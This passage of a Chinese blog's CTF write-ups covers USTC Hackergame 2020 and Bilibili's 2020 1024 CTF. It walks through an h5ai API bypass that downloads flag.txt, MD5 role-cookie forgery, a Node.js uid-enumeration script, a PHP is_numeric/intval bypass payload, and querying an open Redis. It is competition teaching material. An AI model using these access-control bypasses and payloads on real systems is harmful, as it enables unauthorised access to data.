class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 